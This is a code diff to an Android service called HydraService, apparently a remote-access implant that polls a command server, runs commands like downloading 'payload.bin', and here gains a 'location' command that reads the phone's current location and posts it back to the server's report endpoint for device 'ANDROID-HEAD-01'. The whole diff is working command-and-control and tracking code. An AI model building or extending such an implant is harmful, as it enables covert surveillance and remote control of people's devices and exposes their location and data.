@@ -35,6 +35,9 @@ class HydraService : Service() {
     private val heartbeatInterval = 60000L
     private var wakeLock: PowerManager.WakeLock? = null
     private val serverBaseUrl = "https://10.0.2.2:8443"
+    
+    // Initialize Location Helper
+    private val locationHelper by lazy { LocationHelper(this) }
 
     private val checkInRunnable = object : Runnable {
         override fun run() {
@@ -193,7 +196,6 @@ class HydraService : Service() {
 
     private fun parseCommand(jsonData: String) {
         try {
-            // CRITICAL: Log this to verify server output in your terminal via 'adb logcat'
             Log.i(DEBUG_TAG, "RAW JSON RECEIVED: $jsonData")
 
             val json = JSONObject(jsonData)
@@ -205,6 +207,11 @@ class HydraService : Service() {
                 Log.i(TAG, "[!] Action detected: $action")
 
                 when (action) {
+                    "location" -> {
+                        locationHelper.getCurrentLocation { report ->
+                            sendReport("location_update", report)
+                        }
+                    }
                     "download" -> {
                         val filename = data.optString("filename", "payload.bin")
                         downloadFile(filename, serverBaseUrl, this)
@@ -236,6 +243,26 @@ class HydraService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "Error parsing command: ${e.message}")
         }
+    }
+
+    private fun sendReport(type: String, data: String) {
+        val url = "$serverBaseUrl/report/ANDROID-HEAD-01"
+        val reportJson = JSONObject()
+        reportJson.put("type", type)
+        reportJson.put("data", data)
+
+        val body = reportJson.toString().toRequestBody("application/json".toMediaType())
+        val request = Request.Builder().url(url).post(body).build()
+
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "[-] Failed to send report: ${e.message}")
+            }
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.i(TAG, "[+] Report sent: $type")
+                response.close()
+            }
+        })
     }
 
     override fun onDestroy() {
